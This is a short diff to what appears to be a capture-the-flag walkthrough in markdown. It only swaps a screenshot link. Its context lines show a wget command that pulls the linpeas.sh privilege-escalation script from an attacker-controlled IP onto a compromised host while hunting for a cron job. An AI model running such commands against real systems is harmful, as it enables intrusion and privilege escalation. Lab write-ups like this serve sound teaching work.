@@ -136,7 +136,7 @@ On the remote host :
 $ wget http://10.11.92.0:8000/linpeas.sh
 ```
 From the LinPeas output I found a interesting cron job run as bob-boba :
-![LinPeas output](https://www.noelshack.com/2024-27-6-1720271405-screenshot-from-2024-07-06-15-08-20.png)
+![LinPeas output](https://image.noelshack.com/fichiers/2024/27/6/1720271405-screenshot-from-2024-07-06-15-08-20.png)
 
 Unfortunately we cannot acces the file :
 ```bash
